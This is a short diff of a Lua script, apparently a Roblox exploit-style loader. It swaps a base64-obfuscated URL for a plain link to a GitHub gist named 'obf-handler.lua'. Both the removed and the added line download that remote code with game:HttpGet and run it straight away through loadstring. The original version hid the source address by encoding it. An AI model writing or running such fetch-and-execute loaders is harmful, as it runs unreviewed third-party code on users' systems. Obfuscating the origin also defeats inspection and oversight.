@@ -53,7 +53,7 @@ function decodeink(data, autolaunch, mode)
 end
 
 
-return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3L2RjZWZkODM5ZWY5NjUzNWUzMDZiNmE1NDE3YzA2ZDMzYTc2ZTViNjMvb2JmLWhhbmRsZXIubHVh",loadstring('return false')(),2))))()
+return loadstring(game:HttpGet("https://gist.githubusercontent.com/Pro666Pro/81253c0874c84e33b5ae5c70ac29eaa9/raw/dcefd839ef96535e306b6a5417c06d33a76e5b63/obf-handler.lua"))() -- you skibidi btw
 
 --[[
 api_decode = function(api_keys)
